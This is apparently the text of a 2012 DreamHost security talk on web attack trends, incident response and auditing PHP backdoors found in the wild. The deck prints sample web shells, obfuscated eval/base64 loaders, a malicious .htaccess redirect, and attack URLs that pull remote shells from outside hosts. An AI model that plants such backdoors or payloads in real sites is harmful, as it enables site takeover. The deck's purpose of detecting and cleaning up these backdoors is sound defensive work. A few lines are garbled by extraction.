1

The state of web application

security

2012

Robert Rowley Security Architect
DreamHost Robert.Rowley@DreamHost.com
1

2
Break Down
Attack Trends Attacker Motivation Auditing Backdoors

3
Trends

4
Collecting data
Web Application Firewall (mod_security) Running on 1,000,000+ websites Centralized logging

5
Trend data sets
26 Million records. Time frame: August 2011 ­ Present

6
Attacks!

7
Breaking it down

8
Specific attacks against software
 E107
­ Remote code execution ­ ?var=[php]exec(); ­ Released May 2010 (CVE-2010-2099)
 ZenCart
­ SQL injection/execution ­ Released MayC2VE0-200099-22(54CVE-2009-2254)

9

E107

ZenCart

10
timthumb
 Allows arbitrary file upload  Including fully functional php files  Popular wordpress theme component
 (not part of wordpress core, or plugins)
 Released August 2011 (CVE-2011-4106)

11
E107 ZenCart

12
timthumb

13
Life-cycle of an exploit

Puberty

Maturity

14
Theory about this trend...
Attacks are automated.
­ Lead time for attack code update.
Successful compromise adds a new node.
­ This creates fluctuations in growth.

15
PHP-CGI remote code execution
 Arbitrary code execution  Source code disclosure  Denial of service  Released May 2012 (CVE-2012-1823)  Our staff was notified  We rolled out a virtual patch before the 0day was
released.

16
E107 ZenCart timthumb

17
PHP-CGI
0-D ay

PHP-CGI

18
Puberty

19
Attack Response
Notify the ISP's abuse desk 90 ISPs notified each day Most are non-responsive to the report.

20
Attack sources
 Home/Business ISP (20%)  Hosting/Datacenter (80%)

21
A little about incident response

22
Response breakdown
Immediate mitigation
Put out the fire Monitor Review
Long term fixes
Correct business policy Secure code and/or configurations Etc...

23
Standard approach
Monitoring

Evaluation, Update

Vulnerability released, Incident

Assessment, Incident Response

24
Better approach
Monitoring

Evaluation, Update

Vulnerability released, Incident

Assessment, Incident Response

25
Auditing nitty gritty
File monitoring (you do this right?) Logs (correlate timestamps) Logs (sort by request!) No logs? Malware detection by hand

26
FileSystem Monitoring
Part of your backups.
Just use rsync
Inotify (kernel level) Tripwire (daemon/service) DIY

27
Digging in with timestamps.
$ ls -la omgfire.com/backdoor.php
-rw-rw-r-- 1 user grp 0 Feb 13 21:52 omgfire.com/backdoor.php
$ grep 21:52: logs/omgfire.com/access.log.2012-02-13 123.125.71.31 - - [13/Feb/2012:21:52:53 -0800]
"POST /wp-content/plugins/hello.php HTTP/1.1" 200 158 "-" "Mozilla"

28
Digging in with HTTP logs
$ awk '{print $7}' access.log | sort | uniq -c | sort -n

29
Digging in with HTTP logs
$ awk '{print $7}' access.log | sort | uniq -c | sort -n
1 /phpMyAdmin-2.2.3/index.php 1 /phpMyAdmin-2.5.5-pl1/index.php 1 /phpMyAdmin-2.5.5/index.php 1 /phpMyAdmin-2.5.6-rc2/index.php 1 /phpMyAdmin/index.php 1 /pma/index.php 1 /web/phpMyAdmin/index.php 1 /websql/index.php 2 /phpmyadmin/index.php 4 /robots.txt 242 /

30
No success?
Lets get into some backdoor auditing These backdoors were found in the wild
Show you what to look for Learn more about the attacker's methods

31
Using find to find
 Use "find" on any linux/unix server
find /www/path -exec grep "$fingerprint"
 Use generic fingerprints of commands that execute code.
­ eval, preg_replace, exec, assert, etc...
 Use fingerprints of known backdoors

32
Using find to cleanup
 find /www/path -exec grep "$fingerprint" {} \;
 find /www/path -exec grep "$fingerprint" {} \; -exec chmod 0 {} \;
 find /www/path -exec grep "$fingerprint" {} \; -exec sed "s/$fingerprint//" {} \;

33
Attacker Motivation
?

34
Attacker Motivation
$

35
Find an exploit? Do the right thing.
Bounty programs (facebook, google, paypal) Responsible disclosure Don't become a criminal

36
0-day to Pay-day
 Install backdoors
 Sell access to backdoors on the black market
Phishing Spam BlackHat SEO Traffic Theft Install more backdoors

37
Payday
Phishing
Identity/Password theft
http://site/some_dir/www.bankingsite.com/

38
Payday
Spam Everyone knows this already

39
Payday
BlackHat SEO
Hidden links injected on site Redirect visitors

40
Payday
Traffic Theft
Javascript/Iframe/other Redirect site traffic to malicious pages (malware installs) Flashback trojan

41
Payday
Install more backdoors on the site
Why not? Backdoor on backdoor action

42
Little more on traffic theft.
Q1 2012 we noticed an influx of these Actions were taken, data was recorded

43
Example .htaccess infection:
ErrorDocument 404 http://congatarcxisi.ru/ RewriteCond %{HTTP_REFERER} ^.*(google|yahoo|... RewriteRule ^(.*)$ http://congatarcxisi.ru/ [R=301,L]

44
Collection
 Pulled the remote site from any .htaccess similar to the previous example.
 1000 unique domains found
Let's break it down

45
SiteCheck report

 Safe  Low Risk  Malicious  Unknown

( 2%) (29%) (31%) (38%)

46
TLD

 .ru

(64%)

 .com (14%)

 .info ( 8%)

 .in

( 8%)

 .org ( 3%)

 .net ( 2%)

 other ( 1%)

47
Registrars

 Reg.ru  Directi  Other  GoDaddy

(50%) (18%) (18%) (13%)

48

IP address

 other  208.87.35.103  94.63.149.246  208.73.210.29  69.43.161.154  221.132.34.163  95.211.131.185  74.117.116.96  94.63.149.247  79.137.226.90  69.165.98.21  194.28.114.102

(33%) (22%) (10%) ( 9%) ( 5%) ( 5%) ( 4%) ( 4%) ( 2%) ( 2%) ( 2%) ( 2%)

49
Backdoor evolution
Plaintext Base64 decode Preg_replace and beyond!!!

50
Collection
 Compromised sites  Attack logs

51
Getting backdoors from attack logs timthumb.php
 Example malicious URL
.../timthumb.php?src=http://flickr.com.bpmohio.com/bad.php
 Download Backdoor
curl http://flickr.com.bpmohio.com/bad.php
 Review/Categorize/Report
o--=[ r57 PHP Shell ]=--o $version = "2009";

52
Getting backdoors from attack logs PHP-CGI
 Example malicious URL
/?-d...auto_prepend_file=http://64.109.183.21/bin/acesso.txt
 Download Backdoor
wget http://64.109.183.21/bin/acesso.txt
 Review/Categorize/Report
r57shell - http-shell by RST/GHC | http://rst.void.ru | http://ghc.ru version = "1.666";

53
Dead Simple
<?php eval($_POST['payload']); ?>

54
Some Authentication
if(md5($_COOKIE['be80d91eb9db4ffa']) == "e8fa67e99b7e07e9e699f8c3d1dbb43d" ) { eval($_POST['payload']); exit; }

55
Well Documented
#####cfg##### # use password true / false # $create_password = true; $password = "mugus"; // default password # UNIX COMMANDS # description (nst) command # example: Shutdown (nst) shutdown -h now ######ver#### $ver= "v2.1"; ############# $pass=$_POST['pass']; if($pass==$password){ ...

56
Base64 decode
eval(base64_decode('JGF1dGhfcGFzcyA9IC...

57
Base64 decode
eval(base64_decode('JGF1dGhfcGFzcyA9IC...
My favorite way to handle them: sed s/eval/print/g < inputfile > outputfile print(base64_decode('JGF1dGhfcGFzcyA9IC...
PHP parser outputs: $auth_pass = "35a93487bc9204c...

58
GZinflate
<? error_reporting(0); echo "ok!"; $code = "xZbNYaMwFFP3lfoO7JJHwnXa ... "; @eval(gzinflate(base64_decode($code))); ?>

59
Gold star for trying ...
eval(gzinflate(str_rot13(base64_decode('FJ3FjsNculJfpX T9WB6YVnfdltmJmW ...

60
Regex revenge
preg_replace("/.*/e","\x65\x76\x61\x6C\x28\x67...

61
Regex revenge
preg_replace("/.*/e","\x65\x76\x61\x6C\x28\x67...
65 = e 76 = v 61 = a 6C = l 28 = (

62
Variables as functions
$HixNlV='as';$eQovrf='e';$xsEWcg=$HixNlV.'s'.$eQovr f.'r'.'t';$HtJYXB='b'.$HixNlV.$eQovrf.(64).'_'.'d'.$eQo vrf.'c'.'o'.'d'.$eQovrf;
@$xsEWcg(@$HtJYXB('ZXZhbChnemluZm...

63
Variables as functions
$HixNlV='as';$eQovrf='e';$xsEWcg=$HixNlV.'s'.$eQovr f.'r'.'t';$HtJYXB='b'.$HixNlV.$eQovrf.(64).'_'.'d'.$eQo vrf.'c'.'o'.'d'.$eQovrf;
@$xsEWcg(@$HtJYXB('ZXZhbChnemluZm...
assert(base64_decode('ZXZhbChnemluZm...

64
Uhm what...
$FR='sFwFLOzO'|~OU; $cYqFBi=r7bSCQ&'J|Ok@V'; $z3X0fdta1Nz="c>_"&'Q7['; $kg6i=#qfapJag'.']/=nX/'^'8'.KyK6.'{'; $iZBTF=lsrc.'<'.Smef&srzI.':'.VmqH;

65
Itty Bitty Bitwise Operators
$FR='sFwFLOzO'|~OU; $cYqFBi=r7bSCQ&'J|Ok@V'; $z3X0fdta1Nz="c>_"&'Q7['; $kg6i=#qfapJag'.']/=nX/'^'8'.KyK6.'{'; $iZBTF=lsrc.'<'.Smef&srzI.':'.VmqH;

66
Backdoor Conclusions
Attackers are evolving their code Fingerprinting can be untrustworthy Monitor your filesystem

67
Thank you
Trustwave (mod_security) DreamHost & DreamHost customers White hat security researchers
OWASP Security BSides HITcon

68
Further Reading
Mikko Hypponen (TED talks) http://blog.spiderlabs.com http://blog.dreamhost.com/category/security
Want to follow up? Email: robert.rowley@dreamhost.com Twitter: @iamlei

